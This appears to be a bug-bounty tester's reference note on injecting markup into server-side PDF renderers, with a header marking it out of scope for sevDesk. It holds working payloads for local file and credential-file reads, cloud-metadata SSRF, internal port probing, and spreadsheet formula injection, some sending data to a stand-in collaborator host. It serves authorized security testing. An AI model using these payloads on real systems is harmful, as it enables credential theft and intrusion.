# Server-side renderer injection

> ## ⚠️ Out of scope on the sevDesk program
>
> The program policy states that the invoice PDF custom layout feature *"allows users to
> embed external resources via `<img>`, `<iframe>`, fonts, files, and make HTTP requests.
> This is intended behavior. SSRF and similar issues caused by external content loading or
> HTTP requests through these features are out of scope."*
>
> **Sections 1–5 below do not apply to this target.** Do not spend time on `file:///` reads,
> cloud metadata SSRF, or collaborator callbacks through invoice templates — it is a known
> and accepted design decision, and submitting it wastes a report on a guaranteed
> out-of-scope close.
>
> What survives the exclusion:
> - **CSV / formula injection in exports** (last section) — a different feature, not covered
>   by the PDF exclusion.
> - **Cross-tenant access to a rendered PDF** — that is cross-client access, explicitly
>   carved back into scope. See §1 of `TEST-PLAN.md`, not this file.
> - **XSS that fires in a victim's browser** rather than in the renderer. See §3 of
>   `TEST-PLAN.md`, and prioritise the AngularJS template-injection vector.
>
> The rest of this file is kept as reference for other targets, where this is usually the
> highest-severity finding available on an invoicing product. It is retained deliberately:
> the technique is correct, it just does not apply here.

---

For any feature that converts user-controlled input into a document server-side — invoice
and offer PDFs, exports, email templates. If the pipeline is headless Chrome, `wkhtmltopdf`,
`Puppeteer`, `WeasyPrint` or similar, injected markup is parsed **on the vendor's server**,
not in a victim's browser. That turns what looks like a formatting bug into local file read
or SSRF against internal infrastructure.

It is routinely missed because testers check the field for `<script>alert(1)</script>`, see
no browser popup, and move on.

## Where to inject

Any field that lands in the rendered document: line-item description, invoice header and
footer text, customer address block, custom fields, template names, payment terms, the
company profile fields that appear on every document.

## Confirming a renderer is server-side at all

Start here. Inject harmless markup and generate the PDF:

```html
<b>bold</b><h1>heading</h1>
```

- Renders as literal text → properly escaped, move on.
- Renders as actual bold text and a heading → **markup is being parsed server-side.** Continue.

## Escalation, in order

### 1. Local file read

```html
<iframe src="file:///etc/passwd" width="1000" height="800"></iframe>
<iframe src="file:///proc/self/environ" width="1000" height="800"></iframe>
<object data="file:///etc/hostname" width="1000" height="200"></object>
```

Generate the PDF and **open it**. File contents appear as text inside the document. Also try
`file:///app/.env`, `file:///proc/self/cwd/.env`, and any framework config path — environment
files are where the database credentials and API keys live, and that difference decides
whether this is a high or a critical.

### 2. Cloud metadata SSRF

If the renderer runs on AWS/GCP/Azure, the metadata endpoint hands out IAM credentials:

```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        width="1000" height="600"></iframe>

<!-- GCP / Azure need a header, so IMDSv2-style endpoints often resist iframes.
     Try the flat GCP path, which historically did not: -->
<iframe src="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
        width="1000" height="600"></iframe>
```

Retrieving live IAM credentials is a critical. Stop escalating the moment you have proof —
retrieve the credential listing, screenshot it, and **do not use the credentials**. Using them
to enumerate the account converts a clean report into unauthorized access.

### 3. Blind SSRF confirmation

If nothing renders visibly, the request may still be made. Point it at a collaborator
(Burp Collaborator, `interactsh`, or your own logged endpoint) and watch for the callback:

```html
<link rel="stylesheet" href="https://YOUR-COLLABORATOR/x.css">
<img src="https://YOUR-COLLABORATOR/x.png">
<iframe src="https://YOUR-COLLABORATOR/frame"></iframe>
```

The callback's source IP and User-Agent tell you what the renderer is and where it runs.
A `HeadlessChrome` UA from a cloud IP range confirms the whole class.

### 4. JavaScript execution in the renderer

Headless Chrome executes script during rendering, which reaches internal HTTP services that
`file://` and iframes cannot:

```html
<script>
  fetch('http://localhost:8080/admin')
    .then(r => r.text())
    .then(t => { document.body.innerText = t.substring(0, 2000); });
</script>
```

Give the renderer time to settle — some pipelines snapshot before async work finishes. If the
content appears in the PDF, you have authenticated-as-the-server access to internal services.

### 5. Internal port and service discovery

Only after the above confirms the primitive, and keep it small — a handful of well-chosen
ports, not a sweep. A port scan through someone's PDF renderer is exactly the "automated
scanning" most policies prohibit:

```html
<iframe src="http://127.0.0.1:6379" width="600" height="200"></iframe>  <!-- redis -->
<iframe src="http://127.0.0.1:9200" width="600" height="200"></iframe>  <!-- elastic -->
<iframe src="http://127.0.0.1:8080" width="600" height="200"></iframe>
```

## Related: CSV / formula injection in exports

Different sink, same "the victim is downstream" logic. Accounting products export to CSV and
to tax-advisor formats like DATEV, and the recipient opens them in Excel:

```
=cmd|'/c calc'!A1
@SUM(1+1)*cmd|'/c calc'!A1
+cmd|'/c calc'!A1
-2+3+cmd|'/c calc'!A1
=HYPERLINK("https://YOUR-COLLABORATOR/?x="&A1,"click")
```

The `HYPERLINK` variant is the one to lead with: it exfiltrates spreadsheet contents without
needing a macro warning to be clicked through, so it demonstrates impact without arguing about
Excel's security prompts. Frame the victim as the **tax advisor** — cross-organization document
sharing is a first-class product feature here, not a contrived scenario, which is what separates
this from the "won't fix, that's Excel's problem" pile.

## Reporting notes

- Report the *primitive*, not the payload. "Arbitrary local file read as the rendering service"
  with `/etc/passwd` as proof beats "I put an iframe in an invoice".
- Include the rendered PDF as evidence, and the request that generated it.
- Say explicitly that you stopped at proof: retrieved the credential listing but did not
  authenticate with it, read `/etc/passwd` but did not read application secrets. State it even
  if you think it is obvious — it is the difference between a clean critical and a policy
  conversation.
- If you land IAM credentials, treat it as urgent and say so in the report title. Those need
  rotating whether or not the finding is eventually paid.
